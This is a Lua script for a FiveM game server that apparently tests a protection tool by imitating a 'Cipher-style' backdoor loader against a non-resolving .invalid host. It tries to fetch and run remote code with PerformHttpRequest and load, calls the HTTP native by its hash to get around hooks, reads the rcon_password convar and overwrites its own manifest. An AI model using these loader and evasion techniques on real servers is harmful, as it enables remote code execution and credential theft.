-- HARMLESS DEMONSTRATION. It imitates the *shape* of a Cipher-style loader (download a string over HTTP,
-- run it with `load`) but the "C2 domain" is under .invalid (reserved by RFC 2606, it can never resolve)
-- and the "payload" only prints a line. There is no malicious code in this file.

local C2 = 'https://cipher-demo.invalid/payload.lua'

local function say(...)
	print('^5[demo]^7', ...)
end

CreateThread(function()
	Wait(3000)
	say('--- attempt 1: the classic loader: PerformHttpRequest + load ---')
	PerformHttpRequest(C2, function(status, body)
		say(('callback received status=%s body=%s'):format(tostring(status), tostring(body)))
		if body then
			local fn = load(body)
			if fn then
				pcall(fn)
			end
		end
	end, 'GET')

	Wait(1000)
	say('--- attempt 2: run a string of code received from "somewhere" ---')
	local fn, err = load('return "the dynamic code ran"')
	say('load returned:', fn and fn() or ('refused: ' .. tostring(err)))

	Wait(1000)
	say('--- attempt 3: skip PerformHttpRequest and call the HTTP native by its hash ---')
	local request = msgpack.pack({ url = 'https://cipher-demo.invalid/via-invoke-native', method = 'GET' })
	local id = Citizen.InvokeNative(0x6b171e87, request, #request, Citizen.ResultAsInteger())
	say('InvokeNative returned request id', tostring(id))

	Wait(1000)
	say('--- attempt 4: read a secret convar ---')
	local value = GetConvar('rcon_password', '')
	say('rcon_password is ' .. (value ~= '' and 'set (value not printed)' or 'empty'))

	Wait(1000)
	say('--- attempt 5: rewrite my own manifest to drop the protection ---')
	local resource = GetCurrentResourceName()
	local original = LoadResourceFile(resource, 'fxmanifest.lua')
	local saved = SaveResourceFile(resource, 'fxmanifest.lua', '-- emptied by the demo', -1)
	say('SaveResourceFile(fxmanifest.lua) returned', tostring(saved))
	if saved and original then
		-- observe mode lets the write through: put the manifest back so the demo stays usable
		SaveResourceFile(resource, 'fxmanifest.lua', original, -1)
		say('(the demo restored its own manifest)')
	end
end)
